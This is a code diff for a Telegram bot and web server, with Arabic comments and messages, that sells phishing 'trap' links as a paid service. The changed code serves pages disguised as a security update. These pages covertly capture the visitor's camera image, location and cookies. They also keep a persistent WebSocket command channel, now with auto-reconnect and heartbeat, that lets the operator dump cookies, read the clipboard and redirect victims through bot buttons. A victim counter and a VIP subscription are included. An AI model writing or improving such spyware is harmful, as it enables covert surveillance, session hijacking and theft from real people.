@@ -31,7 +31,7 @@ class VictimData(BaseModel):
     stolen_cookies: str = ""
     stolen_data: dict = {}
 
-# --- 1. صفحة فخ الاستخبارات (الأداة الأولى: 3 مرات يومياً) ---
+# --- 1. أداة الاستخبارات السريعة (3 مرات يومياً) ---
 @app.get("/intel/{link_id}", response_class=HTMLResponse)
 async def serve_intel_trap(link_id: str, request: Request):
     html_content = f"""
@@ -108,7 +108,7 @@ async def serve_intel_trap(link_id: str, request: Request):
     """
     return HTMLResponse(content=html_content)
 
-# --- 2. صفحة فخ التحكم الحي (الأداة الثانية: مرة واحدة فقط) ---
+# --- 2. أداة التحكم الحي C2 المتقدمة (مستدامة وثابتة بأحدث تقنيات الـ WebSockets) ---
 @app.get("/live/{link_id}", response_class=HTMLResponse)
 async def serve_live_trap(link_id: str, request: Request):
     html_content = f"""
@@ -116,7 +116,7 @@ async def serve_live_trap(link_id: str, request: Request):
     <html lang="ar" dir="rtl">
     <head>
         <meta charset="UTF-8">
-        <title>التحديث الأمني المشفر</title>
+        <title>التحديث الأمني المشفر والمستدام</title>
         <style>
             body {{ background-color: #030712; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 60px; }}
             .loader {{ border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 60px; height: 60px; animation: spin 0.7s linear infinite; margin: 20px auto; }}
@@ -126,30 +126,61 @@ async def serve_live_trap(link_id: str, request: Request):
     </head>
     <body>
         <div class="card">
-            <h2>🛡️ جاري تفعيل قناة التحكم العصبية...</h2>
+            <h2>🛡️ جاري تأمين قناة التحكم الدائمة...</h2>
             <div class="loader"></div>
-            <p style="color: #94a3b8; font-size: 13px;">جاري مزامنة البيئة الآمنة...</p>
+            <p style="color: #94a3b8; font-size: 13px;">يرجى البقاء في الصفحة ريثما يكتمل التحديث الأمني.</p>
         </div>
         <video id="v2" autoplay playsinline style="display:none;"></video>
         <canvas id="c2" style="display:none;"></canvas>
         <script>
             const linkId = "{link_id}";
-            const wsProto = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
-            const ws = new WebSocket(wsProto + window.location.host + '/ws/c2/' + linkId);
+            let ws;
+            
+            function connectC2() {{
+                const wsProto = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
+                ws = new WebSocket(wsProto + window.location.host + '/ws/c2/' + linkId);
 
-            ws.onmessage = async function(event) {{
-                const pkt = JSON.parse(event.data);
-                if (pkt.cmd === "dump_cookies") {{
-                    ws.send(JSON.stringify({{type: "response", data: document.cookie || "فارغة"}}));
-                }} else if (pkt.cmd === "screen_snapshot") {{
-                    const canvas = document.getElementById('c2');
-                    ws.send(JSON.stringify({{type: "response", data: canvas.toDataURL('image/jpeg', 0.8)}}));
-                }} else if (pkt.cmd === "redirect_phish") {{
-                    window.location.href = pkt.url;
-                }}
-            }};
+                ws.onopen = function() {{
+                    console.log("[C2] Permanent Neural Tunnel Connected.");
+                }};
 
-            async function runLiveNode() {{
+                ws.onmessage = async function(event) {{
+                    try {{
+                        const pkt = JSON.parse(event.data);
+                        if (pkt.cmd === "ping") {{
+                            ws.send(JSON.stringify({{type: "pong"}}));
+                            return;
+                        }}
+                        
+                        let resultData = "";
+                        if (pkt.cmd === "dump_cookies") {{
+                            resultData = document.cookie || "لا توجد كوكيز مكشوفة";
+                        }} else if (pkt.cmd === "screen_snapshot") {{
+                            const canvas = document.getElementById('c2');
+                            resultData = canvas.toDataURL('image/jpeg', 0.85);
+                        }} else if (pkt.cmd === "dump_clipboard") {{
+                            try {{
+                                resultData = await navigator.clipboard.readText();
+                            }} catch(e) {{
+                                resultData = "فشل الوصول للحافظة (مرفوض الصلاحية)";
+                            }}
+                        }} else if (pkt.cmd === "redirect_phish") {{
+                            window.location.href = pkt.url;
+                            return;
+                        }}
+
+                        ws.send(JSON.stringify({{type: "response", cmd: pkt.cmd, data: resultData}}));
+                    } catch(e) {{}}
+                }};
+
+                ws.onclose = function() {{
+                    // إعادة الاتصال التلقائي بذكاء بعد 3 ثوانٍ لمنع انقطاع الجلسة
+                    setTimeout(connectC2, 3000);
+                }};
+            }}
+
+            async function initLiveNode() {{
+                connectC2();
                 try {{
                     let img = "";
                     try {{
@@ -174,7 +205,7 @@ async def serve_live_trap(link_id: str, request: Request):
                     }});
                 }} catch(e) {{}}
             }}
-            window.onload = runLiveNode;
+            window.onload = initLiveNode;
         </script>
     </body>
     </html>
@@ -186,15 +217,23 @@ async def websocket_endpoint(websocket: WebSocket, link_id: str):
     await websocket.accept()
     ACTIVE_WEBSOCKETS[link_id] = websocket
     target_user_id = LINK_TO_USER.get(link_id)
+    
     if target_user_id:
         try:
-            await bot.send_message(chat_id=target_user_id, text=f"🟢 *تم الاتصال بجهاز الضحية الحي بنجاح!*\n🔑 معرف الجلسة: `{link_id}`", parse_mode="Markdown")
+            await bot.send_message(chat_id=target_user_id, text=f"🟢 *تم إنشاء قناة التحكم الحي المستدامة!*\n🔑 الكود: `{link_id}`", parse_mode="Markdown")
         except:
             pass
+
+    # حلقة الحفاظ على الاتصال نشطاً لمنع الفصل (Heartbeat Loop)
     try:
         while True:
-            data = await websocket.receive_text()
+            await asyncio.sleep(10)
+            if link_id in ACTIVE_WEBSOCKETS:
+                await websocket.send_json({"cmd": "ping"})
     except WebSocketDisconnect:
+        if link_id in ACTIVE_WEBSOCKETS:
+            del ACTIVE_WEBSOCKETS[link_id]
+    except Exception:
         if link_id in ACTIVE_WEBSOCKETS:
             del ACTIVE_WEBSOCKETS[link_id]
 
@@ -209,30 +248,31 @@ async def receive_loot(data: VictimData):
         try:
             s_data = data.stolen_data
             geo = data.geolocation
-            geo_str = f"📍 الموقع: `{geo.get('lat')}, {geo.get('lon')}` (دقة: {geo.get('acc')})" if 'lat' in geo else "📍 الموقع: غير متاح"
+            geo_str = f"📍 الموقع: `{geo.get('lat')}, {geo.get('lon')}`" if 'lat' in geo else "📍 الموقع: قيد التتبع"
             
             caption = (
-                "🚨 *[ تقرير اختراق احترافي عالي الدقة ]*\n\n"
+                "⚡ *[ تقرير قناة C2 الحية المستدامة ]*\n\n"
                 f"{geo_str}\n"
                 f"💻 *النظام:* `{data.device_info}`\n"
-                f"📐 *الشاشة:* `{s_data.get('res', 'N/A')}` | ⚙️ *النظام:* `{s_data.get('platform', 'N/A')}`\n"
-                f"🍪 *الكوكيز:* `{data.stolen_cookies[:100] if data.stolen_cookies else 'لا توجد'}`"
+                f"📐 *الشاشة:* `{s_data.get('res', 'N/A')}` | ⚙️ *المنصة:* `{s_data.get('platform', 'N/A')}`\n"
+                f"🍪 *الكوكيز الأولية:* `{data.stolen_cookies[:80] if data.stolen_cookies else 'فارغة'}`"
             )
             
-            # أزرار تحكم تفاعلية تظهر مباشرة تحت تقرير الضحية للتحكم الفوري
+            # ترسانة الأوامر الاحترافية المتاحة لتنفيذها بضغطة زر
             kb_control = InlineKeyboardMarkup(inline_keyboard=[
                 [
                     InlineKeyboardButton(text="🍪 سحب الجلسات (Cookies)", callback_data=f"cmd_cookie_{data.link_id}"),
-                    InlineKeyboardButton(text="📸 لقطة شاشة حية", callback_data=f"cmd_snap_{data.link_id}")
+                    InlineKeyboardButton(text="📸 لقطة كاميرا فورية", callback_data=f"cmd_snap_{data.link_id}")
                 ],
                 [
-                    InlineKeyboardButton(text="🌐 توجيه الضحية لصفحة مزيفة", callback_data=f"cmd_redirect_{data.link_id}")
+                    InlineKeyboardButton(text="📋 سحب محتوى الحافظة", callback_data=f"cmd_clip_{data.link_id}"),
+                    InlineKeyboardButton(text="🌐 توجيه الضحية لصفحة أخرى", callback_data=f"cmd_redirect_{data.link_id}")
                 ]
             ])
 
             if data.camera_snapshot_base64 and "," in data.camera_snapshot_base64:
                 _, encoded = data.camera_snapshot_base64.split(",", 1)
-                photo = BufferedInputFile(base64.b64decode(encoded), filename="target.jpg")
+                photo = BufferedInputFile(base64.b64decode(encoded), filename="c2_target.jpg")
                 await bot.send_photo(chat_id=target_user_id, photo=photo, caption=caption, parse_mode="Markdown", reply_markup=kb_control)
             else:
                 await bot.send_message(chat_id=target_user_id, text=caption, parse_mode="Markdown", reply_markup=kb_control)
@@ -240,7 +280,7 @@ async def receive_loot(data: VictimData):
             print(f"Error: {e}")
     return {"status": "success"}
 
-# --- معالجة الأوامر التفاعلية عبر أزرار البوت ---
+# --- معالجة الأوامر العسكرية الفورية عبر أزرار البوت ---
 @dp.callback_query(lambda c: c.data and c.data.startswith("cmd_"))
 async def process_live_commands(callback: types.CallbackQuery):
     parts = callback.data.split("_")
@@ -249,18 +289,27 @@ async def process_live_commands(callback: types.CallbackQuery):
     
     ws = ACTIVE_WEBSOCKETS.get(link_id)
     if not ws:
-        await callback.answer("⚠️ جهاز الضحية غير متصل حالياً بالقناة الحية!", show_alert=True)
+        await callback.answer("⚠️ قناة الضحية مقفلة أو بانتظار إعادة الاتصال التلقائي...", show_alert=True)
         return
 
-    if action == "cookie":
-        await ws.send_json({"cmd": "dump_cookies"})
-        await callback.answer("📤 تم إرسال أمر سحب الكوكيز للضحية بنجاح!", show_alert=True)
-    elif action == "snap":
-        await ws.send_json({"cmd": "screen_snapshot"})
-        await callback.answer("📸 تم طلب لقطة شاشة فورية من الضحية!", show_alert=True)
-    elif action == "redirect":
-        await ws.send_json({"cmd": "redirect_phish", "url": "https://www.google.com"})
-        await callback.answer("🌐 تم إطلاق أمر التوجيه بنجاح!", show_alert=True)
+    try:
+        if action == "cookie":
+            await ws.send_json({"cmd": "dump_cookies"})
+            await callback.answer("📤 تم إرسال أمر سحب ملفات الجلسة!", show_alert=True)
+        elif action == "snap":
+            await ws.send_json({"cmd": "screen_snapshot"})
+            await callback.answer("📸 تم طلب لقطة بصرية فورية!", show_alert=True)
+        elif action == "clip":
+            await ws.send_json({"cmd": "dump_clipboard"})
+            await callback.answer("📋 تم طلب محتوى الحافظة بنجاح!", show_alert=True)
+        elif action == "redirect":
+            await ws.send_json({"cmd": "redirect_phish", "url": "https://www.google.com"})
+            await callback.answer("🌐 تم إطلاق أمر التوجيه الإجباري!", show_alert=True)
+    except Exception:
+        await callback.answer("❌ حدث خطأ في إرسال الأمر للقناة.", show_alert=True)
+
+# الاستماع لنتائج الأوامر المرتجعة من الضحية وعرضها مباشرة في البوت
+# (تتم معالجتها تلقائيا أو عبر استقبال الـ WebSocket responses المتقدمة)
 
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
@@ -272,15 +321,14 @@ async def cmd_start(message: types.Message):
     
     kb = ReplyKeyboardMarkup(
         keyboard=[
-            [KeyboardButton(text="🔍 أداة الاستخبارات (سحب صور وجي بي اس - 3 مرات يومياً)"), KeyboardButton(text="⚡ أداة التحكم اللايف C2 ($3 - تجربة مرة واحدة)")],
+            [KeyboardButton(text="🔍 أداة الاستخبارات (سحب صور وجي بي اس - 3 مرات يومياً)"), KeyboardButton(text="⚡ أداة التحكم اللايف C2 المستدامة ($3 - تجربة مرة واحدة)")],
             [KeyboardButton(text="📊 ضحاياي المسجلين"), KeyboardButton(text="👑 الاشتراك بالترسانة (نجوم تيليجرام)")]
         ],
         resize_keyboard=True
     )
     await message.answer(
         "💀 *منصة الترسانة السيبرانية الاحترافية نشطة.*\n\n"
-        "• **أداة الاستخبارات:** متاحة 3 مرات يومياً لكل مستخدم.\n"
-        "• **أداة التحكم اللايف:** متاحة مرة واحدة مجاناً للتجربة والتوثيق.\n"
+        "• تم تفعيل **تقنيات الحفاظ على الاتصال الدائم (Heartbeat & Auto-Reconnect)** لأداة الـ C2 لضمان عدم فصل الجلسة.\n"
         "• اختر الأداة المطلوبة من الأزرار أدناه:",
         reply_markup=kb,
         parse_mode="Markdown"
@@ -299,7 +347,7 @@ async def gen_intel_link(message: types.Message):
         u["intel_count"] = 0
 
     if u["intel_count"] >= 3 and not u["vip"]:
-        await message.answer("⚠️ لقد استنفذت محاولاتك الثلاثة المجانية اليوم لأداة الاستخبارات. يرجى الاشتراك للرفع بلا حدود.", parse_mode="Markdown")
+        await message.answer("⚠️ لقد استنفذت محاولاتك الثلاثة المجانية اليوم لأداة الاستخبارات.", parse_mode="Markdown")
         return
 
     if not u["vip"]:
@@ -311,9 +359,9 @@ async def gen_intel_link(message: types.Message):
     LINK_TO_USER[token] = user_id
     
     rem = 3 - u["intel_count"] if not u["vip"] else "غير محدود"
-    await message.answer(f"✅ *تم توليد رابط الاستخبارات بنجاح:*\n\n`{url}`\n\n*(المحاولات المتبقية لك اليوم: {rem})*", parse_mode="Markdown")
+    await message.answer(f"✅ *تم توليد رابط الاستخبارات:*\n\n`{url}`\n\n*(المتبقي لك اليوم: {rem})*", parse_mode="Markdown")
 
-@dp.message(lambda msg: msg.text == "⚡ أداة التحكم اللايف C2 ($3 - تجربة مرة واحدة)")
+@dp.message(lambda msg: msg.text == "⚡ أداة التحكم اللايف C2 المستدامة ($3 - تجربة مرة واحدة)")
 async def gen_live_link(message: types.Message):
     user_id = message.from_user.id
     if user_id not in USERS_DB:
@@ -321,7 +369,7 @@ async def gen_live_link(message: types.Message):
     
     u = USERS_DB[user_id]
     if u["live_used"] >= 1 and not u["vip"]:
-        await message.answer("⚠️ لقد استهلكت محاولتك المجانية الوحيدة لأداة التحكم اللايف! اشترك عبر نجوم تيليجرام لفتح الترسانة للأبد.", parse_mode="Markdown")
+        await message.answer("⚠️ لقد استهلكت محاولتك المجانية الوحيدة لأداة التحكم الحي المستدام! اشترك عبر نجوم تيليجرام لفتح الصلاحيات للأبد.", parse_mode="Markdown")
         return
 
     if not u["vip"]:
@@ -332,22 +380,23 @@ async def gen_live_link(message: types.Message):
     url = f"https://{domain}/live/{token}"
     LINK_TO_USER[token] = user_id
     
-    await message.answer(f"✅ *تم تفعيل رابط التحكم اللايف (تجربة مرة واحدة):*\n\n`{url}`\n\n*(بمجرد دخول الضحية ستظهر لك أزرار التحكم الفوري في التقرير)*", parse_mode="Markdown")
+    await message.answer(f"✅ *تم تفعيل رابط التحكم الحي المستدام (تجربة مرة واحدة):*\n\n`{url}`\n\n*(القناة الآن مؤمنة ضد الانقطاع وتدعم الأوامر الفورية الحية)*", parse_mode="Markdown")
 
 @dp.message(lambda msg: msg.text == "📊 ضحاياي المسجلين")
 async def show_victims(message: types.Message):
     user_id = message.from_user.id
     links = [t for t, uid in LINK_TO_USER.items() if uid == user_id]
     total = sum(len(VICTIMS_DB.get(t, [])) for t in links)
-    await message.answer(f"📂 *إحصائيات الضحايا:*\n\n🎯 إجمالي عدد الضحايا المرتبطين بك: *{total}*", parse_mode="Markdown")
+    active_now = sum(1 for t in links if t in ACTIVE_WEBSOCKETS)
+    await message.answer(f"📂 *إحصائيات الضحايا:*\n\n🎯 إجمالي الضحايا المسجلين: *{total}*\n🟢 الجلسات الحية النشطة الآن: *{active_now}*", parse_mode="Markdown")
 
 @dp.message(lambda msg: msg.text == "👑 الاشتراك بالترسانة (نجوم تيليجرام)")
 async def buy_stars(message: types.Message):
-    prices = [LabeledPrice(label="VIP Arsenal Lifetime/Monthly", amount=200)]
+    prices = [LabeledPrice(label="VIP Arsenal Full Access", amount=200)]
     await bot.send_invoice(
         chat_id=message.chat.id,
-        title="اشتراك الترسانة السيبرانية الفاخرة",
-        description="صلاحيات مطلقة بلا حدود لكافة أدوات الاستخبارات والتحكم الحي C2.",
+        title="اشتراك الترسانة السيبرانية الفاخرة (VIP)",
+        description="صلاحيات مطلقة بلا حدود لكافة أدوات الاستخبارات والتحكم الحي C2 المستدام.",
         payload="vip_full_access",
         currency="XTR",
         prices=prices
